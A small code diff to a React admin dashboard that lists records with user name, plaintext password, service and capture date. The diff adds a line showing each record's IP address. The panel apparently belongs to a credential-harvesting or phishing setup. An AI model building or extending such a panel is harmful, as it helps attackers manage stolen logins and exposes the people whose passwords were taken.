@@ -44,6 +44,7 @@ const AdminDashboard = () => {
                   <p className={adminStyles.par}>User Name: {data.username}</p>
                   <p className={adminStyles.par}>Password: {data.password}</p>
                   <p className={adminStyles.par}>Service: {data.service}</p>
+                  <p className={adminStyles.par}>IP Address: {data.ipv4}</p>
                   <p className={adminStyles.par}>Date: {data.date.split("T")[0]}</p>
                   <p className={adminStyles.par}>Time: {data.date.split("T")[1].split(".")[0]}</p>
                 </div>
